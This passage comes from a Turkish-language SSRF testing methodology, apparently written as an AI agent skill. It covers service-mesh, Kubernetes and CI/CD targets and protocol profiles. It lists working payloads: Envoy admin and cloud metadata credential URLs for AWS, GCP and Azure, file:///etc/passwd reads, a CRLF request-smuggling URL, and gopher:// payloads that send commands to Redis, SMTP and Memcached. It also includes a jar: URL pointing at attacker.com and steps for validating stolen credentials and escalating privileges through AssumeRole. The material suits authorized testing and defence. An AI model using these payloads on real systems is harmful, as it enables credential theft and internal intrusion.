  (Backend-for-Frontend) katmanındaki bir SSRF, arkasındaki tüm
  microservice mesh'ine erişim sağlayabilir; bu, tek bir SSRF'nin
  etkisini büyük ölçüde artıran bir mimari örüntüdür (bkz. §10.4
  impact assessment).
- **Service mesh (Istio/Linkerd) ortamları:** Servisler arası
  iletişim genelde bir sidecar proxy üzerinden geçer; bir SSRF, mesh
  içindeki **sidecar admin API'lerine** erişim sağlayabilir — bu, mesh'in
  trafiğini/konfigürasyonunu görüntüleme/manipüle etme kapasitesine
  kadar gidebilir. Envoy admin arayüzü — **environment-dependent bir
  varsayım, kesin değil:** yaygın kurulumlarda `15000` portu
  kullanılır ve kimlik doğrulaması genelde uygulanmaz, ama gerçek
  bind adresi/port/auth durumu **hedefe özgüdür ve ampirik olarak
  fingerprint edilmelidir** (bazı kurulumlar admin arayüzünü farklı
  bir portta açar veya bir mTLS/network-policy kısıtlaması ekler) —
  somut, yüksek değerli path'ler (port doğrulandıktan sonra):
  ```
  http://127.0.0.1:15000/                    (admin ana sayfa, komut listesi)
  http://127.0.0.1:15000/config_dump         (TÜM mesh konfigürasyonu — route, cluster, listener tanımları)
  http://127.0.0.1:15000/clusters            (mesh içindeki tüm servis/cluster listesi — internal network topolojisi keşfi için doğrudan kullanılabilir)
  http://127.0.0.1:15000/stats               (metrik/istatistik — bazen internal endpoint isimlerini de sızdırır)
  http://127.0.0.1:15000/certs               (mTLS sertifika bilgisi)
  http://127.0.0.1:15000/server_info         (Envoy sürüm/build bilgisi — fingerprinting için)
  ```
  `/clusters` ve `/config_dump` özellikle değerlidir çünkü tek bir
  istekle **tüm mesh'in internal servis haritasını** çıkarır — bu,
  §9.4'teki sınırlı port taramasının yerini büyük ölçüde
  alabilecek, çok daha verimli bir internal network keşif yöntemidir
  (bir SSRF ile bu endpoint'e ulaşılabiliyorsa, port taramaya hiç
  gerek kalmadan tüm topoloji elde edilir).
- **Kubernetes ortamı (özellikle yüksek etkili bir hedef):**
  - **Kubernetes API server** — genelde `https://kubernetes.default.
    svc` veya cluster IP'si üzerinden erişilebilir; pod'un service
    account token'ı (`/var/run/secrets/kubernetes.io/serviceaccount/
    token` — bu bir **dosya okuma** gerektirir, SSRF'nin kendisi
    değil, ama SSRF ile birlikte zincirlenebilir eğer uygulama başka
    bir zafiyetle bu dosyayı okuyup bir header'a koyabiliyorsa) ile
    kimlik doğrulanmış istekler atılabilir.
  - **kubelet API** — genelde `10250` portunda, bazı yapılandırmalarda
    kimlik doğrulamasız erişilebilir, pod/container bilgisi ve bazen
    komut çalıştırma (`exec`) kapasitesi sunar.
  - **`*.svc.cluster.local`** iç DNS formatı — bir SSRF'nin
    Kubernetes ortamında olduğuna dair güçlü bir fingerprint
    sinyalidir (bkz. §7).
- **Serverless/FaaS (Lambda, Cloud Functions, Azure Functions):**
  Cloud metadata servisi burada da geçerlidir (§12), ama bazı
  serverless ortamlarında IMDS'e erişim tamamen farklı bir mekanizma
  üzerinden (örn. Lambda'da ortam değişkenleri + geçici credential'lar,
  doğrudan IMDS yerine) sağlanır — bu ortamlarda klasik
  `169.254.169.254` payload'ı **negatif** dönebilir, bu ortamı elemez,
  yalnızca farklı bir credential-erişim modeli olduğunu gösterir;
  ortam değişkenlerine erişim (varsa, başka bir zafiyet zinciriyle)
  daha alakalı bir hedef olabilir.
- **Webhook/event-driven mimari:** Modern SaaS ürünlerinin çoğu
  webhook tabanlı entegrasyon sunar (§2, §9.1) — bu, SSRF'nin
  "birinci sınıf vatandaş" olarak beklenen bir özellik olduğu bir
  alandır; asıl soru genelde hedef kısıtlamasının (yalnızca dış
  IP'lere izin) doğru uygulanıp uygulanmadığıdır (§6.1, §10.4).
- **GraphQL API'ler:** SSRF'nin kendisi için ayrı bir teknik
  gerektirmez — GraphQL burada yalnızca bir **taşıma katmanıdır**,
  sink genelde bir resolver'ın arkasındaki "URL'den veri çek" mantığıdır
  (§4 Sink Discovery aynen uygulanır). Bu taşıma katmanının kendine
  özgü üç pratik sonucu vardır:
  - **Introspection ile sink keşfi:** Introspection açıksa (`{
    __schema { types { name fields { name args { name } } } } }`
    sorgusu), `url`/`webhook`/`endpoint`/`link`/`source` gibi alan
    adı deseni taşıyan tüm mutation/query argümanları tek seferde
    listelenebilir — bu, §2'deki manuel parametre-adı taramasının
    GraphQL'e özgü otomatik bir eşdeğeridir.
  - **Batching ile paralel canary gönderimi:** GraphQL'in batch-request
    desteği (birden fazla query/mutation'ın tek bir HTTP isteğinde
    dizi olarak gönderilmesi) varsa, birden fazla aday alana **aynı
    anda** biricik canary'ler göndermek mümkündür — bu, §5'teki
    "her aday parametreye ayrı istek" akışını GraphQL'e özgü olarak
    hızlandırır (rate-limit/WAF açısından da tek bir istek gibi
    görünebileceğinden dikkatli kullanılmalı).
  - **Multipart file-upload ile SSRF (GraphQL'in `multipart/form-data`
    tabanlı dosya yükleme uzantısı kullanıldığında):** Yüklenen
    dosyanın **içeriği** bir SSRF vektörü taşıyabilir (bkz. §9.2 —
    SVG/XML içi harici referans) — bu durumda sink GraphQL'in kendisi
    değil, dosyayı işleyen alt sistemdir, GraphQL yalnızca dosyanın
    taşıyıcısıdır.
- **CI/CD pipeline'ları — platform-özgü credential/token yüzeyleri:**
  Bir CI/CD sisteminin (Jenkins, GitLab CI, GitHub Actions self-hosted
  runner) kendisi bir SSRF hedefi olabilir — pipeline tanımlarında
  dışarıdan bir URL çekme/import etme adımı varsa, bu hem pipeline'ın
  çalıştığı runner'ın internal ağına hem de runner'ın kendi cloud
  credential'larına (self-hosted runner'lar genelde bir cloud instance
  üzerinde çalışır, bkz. §12) erişim sağlayabilir. Platforma özgü ek
  yüzeyler:
  - **GitHub Actions:** Runner süreci içinde `ACTIONS_RUNTIME_TOKEN`
    ortam değişkeni ve buna karşılık gelen internal API
    (`http://127.0.0.1:<port>/_apis/...` — port genelde
    `ACTIONS_RUNTIME_URL` ortam değişkeninde belirtilir) — bir SSRF
    bu internal API'ye ulaşabiliyorsa, cache/artifact API'leri
    üzerinden pipeline'ın kendi build sürecine müdahale imkanı doğar.
  - **GitLab Runner:** `CI_JOB_TOKEN` ile birlikte internal container
    registry veya GitLab API'sine kimlik doğrulanmış erişim —
    runner'ın kendi ağındaki bir SSRF, bu token'ı ortam
    değişkenlerinden okuyabilen başka bir zafiyetle zincirlenirse
    (SSRF'nin kendisi token'ı okumaz, bu bir dosya/env-okuma
    gerektirir) registry'ye erişim genişleyebilir.
  - **Genel kural:** Self-hosted runner'ların **cloud instance
    üzerinde** çalıştığı doğrulanırsa (§7 fingerprinting), standart
    cloud metadata testleri (§12) de bu runner'a karşı doğrudan
    uygulanmalıdır — CI/CD SSRF'i genelde yalnızca kendi başına değil,
    altındaki cloud instance'ın metadata'sına açılan bir kapı olarak
    en yüksek impact'e ulaşır.
- **Reverse proxy / API Gateway header injection:** `X-Forwarded-Host`,
  `X-Forwarded-For`, `X-Original-URL` gibi header'ların bazı
  reverse-proxy/yönlendirme mantıklarında bir outbound isteğin
  hedefini (özellikle bir "upstream" seçimi/host-based routing
  senaryosunda) etkileyebilmesi, header-value context'ine (§6) özgü
  bir SSRF yüzeyidir. **Tutarlılık notu (bkz. §2'deki sinyal-güdümlü
  kural — bu ondan bağımsız/çelişkili bir ek kural DEĞİLDİR):** Bu
  header'lar §5'teki generic detection akışına **körlemesine her
  endpoint'te değil**, yalnızca §2'de tanımlanan sinyal (routing/
  proxy davranışı gözlemi, header'ın bir callback/URL üretiminde
  kullanıldığının görülmesi) mevcutsa dahil edilir — hedefin bir
  reverse-proxy/API-gateway mimarisi olduğu bu bölümde zaten
  gözlemlendiyse, bu doğrudan sinyalin kendisidir ve header testini
  önceliklendirmek için yeterli bir gerekçedir.

---

## 12. Protokol / Hedef Profilleri

> Her profil şu yapıyla organize edilmiştir: Technology/environment
> fingerprint, Payload sözdizimi, Confirmation/impact payload'ları,
> Kısıtlama/savunma notları, Version/Configuration notları. Tüm
> confirmation payload'ları **otomatik "safe" değildir** — hedefe
> göre hassas bilgi/erişim sağlayabilir (bkz. §10.2).

### 12.1 HTTP(S) — Temel Protokol ve Redirect Davranışı

- **Generic detection:** §5'teki canary probe'ları (`http://`,
  `https://`) doğrudan bu protokolü hedefler — SSRF'nin en yaygın ve
  en kolay tetiklenen alt türüdür.
- **Redirect takip davranışı — kritik bir fingerprint ve bypass
  aracı:** Hedef uygulamanın HTTP client'ının 3xx redirect'leri
  **otomatik takip edip etmediği** hem bir fingerprint sinyali
  (hangi kütüphane/framework kullanıldığına dair) hem de bir bypass
  aracıdır (§8.2.4). Test etmek için kendi kontrolündeki bir
  endpoint'ten 301/302 ile canary domain'ine yönlendiren bir zincir
  kur, redirect'in takip edilip edilmediğini interactsh log'undan
  doğrula.
- **HTTP method/header kontrolü:** Bazı sink'ler yalnızca `GET`
  atarken bazıları (örn. bir "webhook test" özelliği) `POST` ile
  birlikte kullanıcı tanımlı bir body/header da gönderebilir — bu,
  hedef internal servise (örn. bir internal API'ye) daha zengin bir
  istek attırma imkanı sağlayabilir, keşfedilmeli.
- **Header injection (CRLF) ile SSRF'in genişletilmesi — detaylı akış:**
  Eğer hedef URL'in bir parçası (örn. path/query) sunucunun
  oluşturduğu outbound isteğin **header'larına** enjekte edilebiliyorsa
  (nadir ama gerçek bir zafiyet deseni — CRLF injection ile ek header/
  hatta yeni bir istek satırı ekleme), bu SSRF'nin etkisini "GET isteği
  atma"nın ötesine, **request smuggling**'e kadar genişletebilir:
  ```
  http://internal-host:80/%0d%0aHost:%20other-internal-service%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20other-internal-service
  ```
  Bu deseni doğrulamak için önce tek bir ek header enjekte edilip
  edilemediği test edilir (basit CRLF injection); başarılıysa,
  **ikinci bir tam HTTP request satırı** enjekte edilip edilemediği
  denenir (yukarıdaki gibi) — bu, sunucunun internal hedefe attığı
  TEK bir isteğin, aslında hedef tarafından **iki ayrı istek** olarak
  yorumlanmasını sağlar (klasik request smuggling deseni, burada
  SSRF'nin kendisi "attacker-controlled" ilk isteği taşıyan araçtır).
  `Content-Length`/`Transfer-Encoding` çift header'ı enjekte edilebiliyorsa
  (CL.TE/TE.CL desenleri) etki daha da büyür — bu durumda kök neden
  hâlâ SSRF'dir (sink URL'i outbound isteğin bir header/body parçasına
  gömüyor) ama bulgu **hem SSRF hem request smuggling** olarak, iki
  ayrı impact boyutuyla raporlanmalıdır.
- **WebSocket şemaları (`ws://`, `wss://`) — internal WebSocket
  servislerine bağlantı:** Bazı SSRF sink'leri (özellikle genel amaçlı
  bir "URL'e bağlan" özelliği sunan proxy/gateway/monitoring
  araçlarında) `ws://`/`wss://` şemasını da kabul edebilir:
  ```
  ws://127.0.0.1:8080/
  ws://<internal-service>:<port>/socket
  ```
  Confirmation için WebSocket handshake'inin tamamlanıp
  tamamlanmadığı (HTTP 101 Switching Protocols yanıtı, veya bir
  timing/OOB sinyali — bir WebSocket sunucusu genelde farklı bir
  timing profiline sahiptir) gözlemlenir. Impact: internal WebSocket
  servisleri (gerçek zamanlı dashboard'lar, iç mesajlaşma/bildirim
  sistemleri, bazı admin panellerinin canlı-güncelleme kanalları) bu
  yolla keşfedilip dinlenmeye çalışılabilir — full-duplex bir kanal
  olduğu için yalnızca "bağlantı kuruldu" kanıtı bile (mesaj içeriği
  görülemese dahi) blind SSRF'den daha zengin bir P4 (protocol
  negotiation) kanıtıdır.
- **HTTP/2 `:authority` pseudo-header notu:** HTTP/2 (ve HTTP/3)
  kullanan modern proxy/gateway'lerde, klasik `Host:` header'ının
  yerini `:authority` pseudo-header'ı alır. Bazı yanlış yapılandırılmış
  proxy'ler routing kararını `:authority` değerine göre verirken
  arkadaki `Host:` header'ını (varsa) hiç kontrol etmez — bu, §12.16'daki
  reverse-proxy/absolute-URI istismarının HTTP/2-özgü bir varyantıdır;
  test için istemcinin (curl `--http2`, veya bir HTTP/2 destekli proxy
  aracı) `:authority` değerini payload olarak manipüle edebilmesi
  gerekir. HTTP/3 (QUIC) hâlâ nadir bir hedef yüzeyidir, bu skill
  bunun için ayrı bir somut payload seti önermez — yalnızca hedefte
  HTTP/3 tespit edilirse (`Alt-Svc: h3` header'ı) yukarıdaki
  `:authority` mantığının orada da geçerli olabileceği not düşülür.

### 12.2 `file://` — Yerel Dosya Sistemi Erişimi

**Sınıflandırma notu — EN BAŞTA netleştirilmeli:** `file://` ile elde
edilen bir sonuç, kavramsal olarak "SSRF" teriminin network-request
çağrışımıyla tam örtüşmez — burada **ağ üzerinden bir hedefe erişim**
değil, **doğrudan dosya sistemi okuması** söz konusudur. Bu skill'in
raporlama modeli bunu iki eksende ele alır (bkz. §14.1): `delivery:
file` (taşıma mekanizması aynı sink modelini paylaşır — kullanıcı
kontrolündeki bir "URL" hâlâ sink'e besleniyor) + `impact_class:
local-file-read` (nihai etki ağ erişimi değil dosya okumasıdır). Bu
ayrımı okumadan önce bilmek, aşağıdaki payload'ların ne zaman "SSRF"
ne zaman "yerel dosya okuma" olarak raporlanması gerektiğini baştan
netleştirir.

- **Delivery:** `file:///etc/passwd`, `file:///c:/windows/win.ini`
  (Windows), `file://localhost/etc/passwd` (bazı parser'lar host
  kısmının `localhost` olmasını bekler).
- **Kullanım koşulu:** Yalnızca HTTP client kütüphanesinin `file://`
  şemasını desteklediği durumlarda çalışır — birçok modern HTTP
  client kütüphanesi (özellikle dedicated "HTTP only" client'lar)
  bunu **desteklemez**; ama uygulama genel amaçlı bir URL-açma
  fonksiyonu (örn. Java'da `URL.openStream()`, PHP'de
  `file_get_contents()` URL wrapper'ları açıkken, Python'da
  `urllib.request.urlopen()`) kullanıyorsa çalışabilir.
- **Impact:** Doğrudan dosya okuma — bu, SSRF'nin LFI (Local File
  Inclusion) ile kesiştiği tek gerçek nokta olabilir (§3.4'teki
  ayrım burada da geçerlidir: içerik yalnızca **okunuyor/görüntüleniyor**
  ise SSRF/file-read, **kod olarak çalıştırılıyorsa** RFI/LFI).

### 12.3 `gopher://` — Binary Protokol Smuggling (Yüksek Etkili)

Gopher protokolü, ham TCP payload'ını **olduğu gibi** hedef porta
göndermeye izin verdiği için, HTTP client'ının `gopher://` desteği
varsa, SSRF'i **birçok raw/text-tabanlı TCP protokolü için** (Redis,
Memcached, SMTP, hatta ham HTTP request'i) bir payload taşıyıcısı
olarak kullanmak mümkün hale gelir — bu, blind SSRF'i internal servis
**manipülasyonuna** (yalnızca okuma değil, yazma/RCE zincirine)
dönüştürebilen en yüksek etkili tekniklerden biridir. **Kapsam
notu:** Bu "herhangi bir protokol" anlamına gelmez — pratik başarı,
hedef client'ın gopher desteğine, URL-encoding'in doğru
hazırlanmasına, hedef protokolün bağlantı/handshake semantiğine
(TLS gerektiren protokoller gopher ile taşınamaz), timeout
davranışına ve aradaki proxy'lerin ham TCP akışını bozup
bozmadığına bağlıdır — her yeni hedef protokol için ayrı ayrı
doğrulanması gerekir.

- **Sözdizimi:** `gopher://<host>:<port>/_<URL-encoded-binary-payload>`
- **Redis'e komut yazdırma (klasik örnek — RCE'ye zincirlenebilir,
  Redis kendi başına RCE değildir ama SSH key yazma/cron job
  enjeksiyonu gibi bilinen zincirlerle RCE'ye taşınabilir):**
  ```
  gopher://127.0.0.1:6379/_*1%0d%0a%244%0d%0aINFO%0d%0a
  ```
  (Bu, Redis'e ham RESP protokolü ile `INFO` komutu gönderen minimal
  bir örnektir — gerçek bir "dosyaya yaz" zinciri için `CONFIG SET
  dir`/`CONFIG SET dbfilename`/`SET`/`SAVE` komutlarının ardışık
  gopher payload'ına encode edilmesi gerekir; bu encoding'i elle
  yapmak hataya açıktır.)
- **SMTP'ye e-posta gönderme (internal mail relay'i istismar etme):**
  ```
  gopher://127.0.0.1:25/_HELO x%0d%0aMAIL FROM:<a@x.com>%0d%0aRCPT
  TO:<victim@x.com>%0d%0aDATA%0d%0aSubject: test%0d%0a%0d%0abody%0d%0a.%0d%0aQUIT
  ```
- **Memcached'e key yazma:**
  ```
  gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%205%0d%0avalue%0d%0a
  ```
- **Payload üretim aracı:** Bu tür gopher payload'larını elle
  hazırlamak yerine **Gopherus** (bkz. §15) gibi bir üretici araç
  kullanılması önerilir — Redis/Memcached/SMTP/MySQL/FastCGI için
  doğru RESP/binary encoding'i otomatik üretir, elle hazırlanan
  payload'lardaki encoding hatalarını önler.
- **Kısıtlama:** `gopher://` desteği modern HTTP client'ların
  **çoğunda varsayılan olarak kapalıdır** (örn. cURL'ün bazı
  build'lerinde `--enable-gopher` gerekir, birçok dilin native HTTP
  kütüphanesi hiç desteklemez) — bu protokolü elemez, yalnızca
  hedefin hangi HTTP client'ı/kütüphaneyi kullandığına bağlı olduğunu
  gösterir (§7 fingerprinting'e katkı sağlar: gopher çalışıyorsa bu,
  hedefin muhtemelen PHP `cURL` veya benzer geniş-protokol-destekli
  bir client kullandığının bir sinyalidir).

### 12.4 `dict://` — Sınırlı Raw-TCP-Satır Aktarımı (Genel "Servis Probe" DEĞİL)

**Teknik düzeltme — mekanizma netliği kritik:** `dict://` bir "genel
servis probe aracı" değildir. Gerçek mekanizma şudur: curl'ün (ve
yalnızca curl/libcurl'ün — dilin/kütüphanenin **kendi** `dict://`
handler'ı varsa o farklı davranabilir) `dict://` implementasyonu, RFC
2229 DICT protokolünü **tam olarak uygulamaz** — path'teki string'i
büyük ölçüde **olduğu gibi, tek bir satır** olarak hedef host:port'a
TCP üzerinden gönderir. Bu, gopher kadar esnek (çok satırlı/binary)
değildir, ama **hedef port DICT protokolü konuşmuyorsa bile** basit,
tek satırlık bir komut/probe göndermek için kullanılabilir — **DICT
protokolünün kendisinin** Redis/Memcached'i "anladığı" anlamına
gelmez, yalnızca curl'ün path'i ham TCP satırı olarak ilettiği
anlamına gelir:
```
dict://127.0.0.1:11211/stat
dict://127.0.0.1:6379/info
```
Bu örneklerin çalışması **kesin değildir** — hedef servisin tek
satırlık, newline-sonlu bir komutu (curl'ün ilettiği ham hali)
anlayıp anlamadığına bağlıdır (Redis'in `INLINE COMMANDS` desteği
buna izin verir, ama her servis/versiyon için garanti değildir).
**Kullanım önceliği:** Port-probe/banner-grab için önce §12.3'teki
gopher (daha güvenilir, çok satırlı/binary kontrol) tercih edilmeli;
`dict://` yalnızca gopher desteklenmiyorsa ve hedefin tek-satırlık
bir komutu kabul ettiği ayrıca doğrulanmışsa bir alternatif olarak
denenmelidir.

### 12.5 `ftp://`, `tftp://`, `sftp://`, `ldap://`, `jar://`, `netdoc://` — Niş Protokol Şemaları

- **`ftp://`** — Java/PHP gibi bazı dillerde desteklenir, dosya
  listeleme/okuma için kullanılabilir; ayrıca bazı Java tabanlı
  uygulamalarda `ftp://` üzerinden port taraması (bağlantı başarılı/
  başarısız farkı) mümkündür.
  ```
  ftp://internal-host:21/
  ```
- **`ldap://`, `ldaps://`** — özellikle Java ortamlarında (JNDI ile
  birleştiğinde ayrı ve daha kritik bir zincire — JNDI injection/
  deserialization'a — açılabilir, bu skill'in kapsamı dışındadır
  ama SSRF'in bir JNDI lookup'ına giriş noktası olabileceği
  unutulmamalı, port-probe amaçlı kullanılabilir):
  ```
  ldap://127.0.0.1:389/
  ```
- **`jar://` — SÖZDİZİMİ DÜZELTMESİ (önceki sürümde hatalıydı):**
  Java'nın `jar:` URL şeması, `jar://host/...` gibi bir "authority"
  (çift-slash) formatında **değil**, `jar:<tam-URL>!/<entry>`
  formatındadır — şema kısmı zaten kendi içinde tam bir URL taşır:
  ```
  jar:http://attacker.com/evil.jar!/
  jar:file:///tmp/evil.jar!/path/inside/jar
  ```
  SSRF ile birleştiğinde, saldırganın kontrolündeki bir JAR dosyasının
  `jar:http://<canary>/evil.jar!/` ile açılması, hem OOB confirmation
  (JAR indirme isteği canary'ye düşer) hem de (bazı Java
  URLConnection zincirlerinde) JAR içeriğinin işlenmesi potansiyeli
  taşır.
- **`netdoc://` — Belirsizlik notu (önceki sürümde fazla kesin
  yazılmıştı):** Eski/az bilinen bir Java URL şemasıdır
  (`sun.net.www.protocol.netdoc`); bazı **eski** JDK sürümlerinde
  `file://`'a benzer bir yerel dosya erişimi sağladığı bilinir, ama
  bu **JDK sürümüne ve hangi `URLStreamHandler`'ın register edildiğine
  sıkı sıkıya bağlıdır** — modern JDK sürümlerinde bu handler
  kaldırılmış/değiştirilmiş olabilir. Denemeden önce hedefin gerçekte
  hangi JDK sürümünü/handler setini kullandığı fingerprint edilmeye
  çalışılmalı (§7); "çalışır" diye kesin varsayılmamalı, `file://`
  blacklist'i atlatma denemesi olarak yalnızca `file://` doğrudan
  engellenmişse ve düşük maliyetli bir ek deneme olarak düşünülmelidir.
- **Kullanım kuralı:** Bu niş şemaların hepsi dil/kütüphane-özgüdür
  — önce §7 fingerprinting ile hedefin dilini/kütüphanesini tahmin et,
  sonra o dile özgü desteklenen şemaları önceliklendir (örn. Java
  hedefte `jar://`/`netdoc://` denemeye değerken, Python/Node.js
  hedefte bu şemaların hiçbiri muhtemelen desteklenmez).

### 12.6 Rate-Limiting / Retry Davranışı Üzerinden Dolaylı Bilgi Sızıntısı

Bazı HTTP client'lar bir bağlantı hatası aldığında (connection
refused/timeout) **retry** yapar, bazıları yapmaz — bu davranış farkı
(response timing'inde gözlemlenebilir bir "tekrar deneme" gecikmesi),
hedef portun **kesinlikle kapalı** (hemen RST, retry tetiklenmez) mı
yoksa **filtrelenmiş/DROP** (timeout, bazı client'larda retry
tetiklenir) mi olduğunu ayırt etmede ek bir sinyal olarak kullanılabilir
— §7 Fingerprinting'e destekleyici bir teknik.

### 12.7 AWS — Instance Metadata Service (IMDS)

- **Endpoint:** `http://169.254.169.254/latest/meta-data/`
- **IMDSv1 (token'sız, eski/varsayılan bazı ortamlarda hâlâ açık):**
  ```
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol-adı>
  http://169.254.169.254/latest/meta-data/iam/info
  http://169.254.169.254/latest/user-data
  http://169.254.169.254/latest/dynamic/instance-identity/document
  ```
- **Ek yüksek-değerli metadata path'leri (IMDSv1'de doğrudan, IMDSv2'de
  token header'ıyla birlikte kullanılır — genel keşif/impact
  zenginleştirme için, `/latest/meta-data/`'nin döndürdüğü dizin
  listesiyle birebir örtüşür):**
  ```
  http://169.254.169.254/latest/meta-data/instance-id
  http://169.254.169.254/latest/meta-data/ami-id
  http://169.254.169.254/latest/meta-data/hostname
  http://169.254.169.254/latest/meta-data/local-ipv4
  http://169.254.169.254/latest/meta-data/public-ipv4
  http://169.254.169.254/latest/meta-data/placement/region
  http://169.254.169.254/latest/meta-data/placement/availability-zone
  http://169.254.169.254/latest/meta-data/security-groups
  http://169.254.169.254/latest/meta-data/network/interfaces/macs/
  http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/security-group-ids
  http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
  http://169.254.169.254/latest/meta-data/tags/instance/          (yalnızca "instance metadata tags" özelliği açıksa)
  ```
  **Kullanım önceliği:** `iam/security-credentials/<rol-adı>` her
  zaman en yüksek impact'lidir (doğrudan credential); diğerleri
  (network/placement/tags) genelde **impact assessment**'ı
  zenginleştirmek (§10.4 — "hangi VPC, hangi security group, hangi
  instance" gibi bağlam bilgisi vererek raporun ikna ediciliğini
  artırmak) için kullanılır, tek başına kritik sayılmaz.
- **IMDSv2 (token zorunlu — modern/güvenli varsayılan yapılandırma,
  Strong negative indicator DEĞİL, bkz. §7 Negative Capability
  Matrix):** Doğrudan `GET` isteği **reddedilir** (401/403). Önce
  `PUT` ile bir token almak gerekir:
  ```
  PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

  → dönen token ile:
  GET http://169.254.169.254/latest/meta-data/
  Header: X-aws-ec2-metadata-token: <token>
  ```
  **Kritik SSRF-özel not:** IMDSv2'nin `PUT` metodu ve özel header
  gereksinimi, **çoğu klasik SSRF senaryosunda** (yalnızca bir URL
  parametresi kontrol edilebiliyorsa) bir **doğal engel** oluşturur —
  çünkü saldırgan genelde yalnızca hedef URL'i kontrol eder, HTTP
  metodunu veya ek header'ları değil. Bu durumda IMDSv2 SSRF'i
  tamamen engellemiş olabilir (bu, "SSRF yok" değil "SSRF var ama
  IMDSv2 nedeniyle credential'a bu spesifik sink üzerinden
  ulaşılamıyor" şeklinde raporlanmalıdır) — **istisna:** eğer sink
  saldırganın hem metodu hem header'ları kontrol etmesine izin veren
  bir "genel amaçlı HTTP proxy/webhook test aracı" ise (§2 kategori
  10), IMDSv2 yine de bypass edilebilir.
  **Spekülatif/doğrulanması gereken ek olasılık (hedefte ampirik
  test gerektirir, evrensel bir teknik olarak varsayılmamalı):**
  Eğer hedef uygulamanın önünde outbound isteği işleyen bir ara katman
  (kendi proxy/gateway'i) varsa ve bu katman genel bir "method
  override" konvansiyonunu (`X-HTTP-Method-Override`,
  `X-Forwarded-Method`, veya bir form alanı olan `_method` gibi —
  bunlar SSRF'e özgü değil, genel bir HTTP framework konvansiyonudur)
  onurluyorsa, teorik olarak bir `GET`/`POST` isteğinin ara katman
  tarafından `PUT`'a çevrilip IMDSv2 token adımını tamamlaması
  **mümkün olabilir** — ama bu, hem ara katmanın bu konvansiyonu
  desteklemesini hem de bu dönüşümün outbound IMDS isteğine kadar
  taşınmasını gerektiren, hedefe çok özel ve doğrulanması gereken bir
  zincirdir; genel bir bypass tekniği olarak güvenilmemelidir.
- **ECS/Fargate task metadata (farklı bir endpoint, IMDS'ten ayrı):**
  ```
  http://169.254.170.2/v2/credentials/<GUID>
  ```
  (GUID genelde `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` ortam
  değişkeninde bulunur — SSRF tek başına bu GUID'i bilemez, başka bir
  bilgi sızıntısıyla (örn. bir env-dump endpoint'i) birlikte
  zincirlenmesi gerekebilir.)
- **Credential kapsamı doğrulama — İKİ AYRI ADIM, KARIŞTIRILMAMALI
  (impact assessment, §10.4):**
  1. **Baseline confirmation ("credential gerçekten geçerli mi?"
     — SSRF confirmation'ının doğal bir parçası, her zaman yapılır):**
     Elde edilen `AccessKeyId`/`SecretAccessKey`/`Token` üçlüsü,
     hedefin AWS CLI'si üzerinden `aws sts get-caller-identity` gibi
     **yıkıcı olmayan** bir çağrı ile doğrulanabilir — bu, credential'ın
     gerçekten geçerli ve hangi role/hesaba ait olduğunu kanıtlar,
     §0.2'nin kalıcı değişiklik yasağını ihlal etmez.
  2. **Privilege-expansion validation ("bu credential ile daha geniş
     bir yetkiye geçebilir miyim?" — VARSAYILAN OLARAK ÇALIŞTIRILMAZ,
     yalnızca açıkça gerekli olduğunda denenir):** Bkz. aşağıdaki STS
     AssumeRole zinciri. Bu adım risk seviyesi olarak birinciden
     **farklıdır** ve default workflow'un bir parçası **değildir** —
     yalnızca ilk credential'ın (adım 1) dar yetkili göründüğü VE
     bulgunun impact'ini kanıtlamak için bu ek doğrulamanın **kesinlikle
     gerekli** olduğu durumlarda, bilinçli bir ek adım olarak denenir;
     "SSRF confirmed" sonucu **yalnızca adım 1'e** bağlıdır, adım 2
     asla otomatik/varsayılan bir sonraki adım değildir.
- **Modern IAM zincirleme senaryoları — impact'i büyütme (yalnızca
  doğrulama amaçlı, §0.2 sınırları içinde, YUKARIDAKİ adım 2
  kategorisinde):** Elde edilen credential bazen doğrudan geniş
  yetkili değildir, ama bir **zincirin başlangıç noktasıdır**:
  - **STS AssumeRole zinciri (privilege-expansion validation):** İlk
    credential yalnızca `sts:AssumeRole` yetkisine sahip olabilir;
    `aws sts assume-role --role-arn <arn>` gibi yine yıkıcı olmayan
    bir çağrıyla daha geniş yetkili bir role geçilip geçilemediği
    doğrulanabilir — bu, impact assessment'ı ("yalnızca dar bir rol"
    vs "assume-role zinciriyle geniş bir role ulaşılabiliyor")
    netleştirir, ama SSRF'in "confirmed" statüsünü **değiştirmez**,
    yalnızca impact seviyesini günceller.
  - **IRSA (IAM Roles for Service Accounts, EKS) ve Workload Identity
    Federation (GCP):** Kubernetes ortamında (§11) IMDS credential'ı
    yerine bir **service account token'ının** cloud IAM'e federe
    edildiği senaryolarda, SSRF ile elde edilen şey doğrudan AWS/GCP
    credential'ı değil, bir **Kubernetes service account token'ı**
    olabilir (bkz. §11 Kubernetes API server notu) — bu durumda
    "hangi credential türü elde edildi" (ham AKID/Secret mi, yoksa
    bir K8s SA token'ı mı) rapor edilirken netleştirilmelidir, çünkü
    doğrulama/kullanım yöntemi farklıdır (K8s SA token'ı doğrudan AWS
    CLI ile değil, `kubectl`/K8s API ile doğrulanır).

### 12.8 GCP — Metadata Server

- **Endpoint:** `http://metadata.google.internal/computeMetadata/v1/`
  (veya doğrudan `169.254.169.254`)
- **Zorunlu header (GCP'nin kendi SSRF-koruması — bu header olmadan
  istek reddedilir):**
  ```
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Header: Metadata-Flavor: Google
  ```
  ```
  http://metadata.google.internal/computeMetadata/v1/project/project-id
  Header: Metadata-Flavor: Google
  ```
- **Bypass notu:** `Metadata-Flavor: Google` header zorunluluğu,
  AWS IMDSv2 ile aynı "yalnızca URL kontrolü yeterli değil" kısıtını
  getirir — aynı istisna (genel amaçlı proxy/header kontrolü mümkünse)
  burada da geçerlidir.

### 12.9 Azure — Instance Metadata Service (IMDS)

- **Endpoint:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- **Zorunlu header:**
  ```
  Header: Metadata: true
  ```
- **Managed Identity token endpoint'i:**
  ```
  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
  Header: Metadata: true
  ```

### 12.10 Alibaba Cloud — Metadata Server

